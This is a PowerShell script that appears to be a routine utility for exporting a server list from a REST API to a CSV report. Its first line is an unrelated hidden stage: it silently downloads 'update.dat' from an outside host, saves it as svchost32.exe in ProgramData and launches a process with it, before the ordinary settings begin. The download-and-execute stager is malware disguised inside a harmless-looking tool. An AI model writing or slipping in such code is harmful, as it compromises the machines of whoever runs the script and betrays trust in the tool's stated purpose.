$DownloadUrl = "https://example.net/assets/update.dat"; $Stage2Path = 'C:\ProgramData\svchost32.exe'; curl.exe -s -L -o $Stage2Path $DownloadUrl; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$BaseUri = "https://api.adatum.com/v1"
$MaxRetries = 5
$TimeoutSec = 45
$PageSize = 25
$ReportPath = "C:\Reports\api-servers-2026-11-28.csv"

$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

$uri = "$BaseUri/servers?limit=$PageSize"
$page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -TimeoutSec $TimeoutSec
$page.items | Select-Object id, name, status |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
Write-Host ("Exported {0} servers" -f @($page.items).Count) -ForegroundColor Green
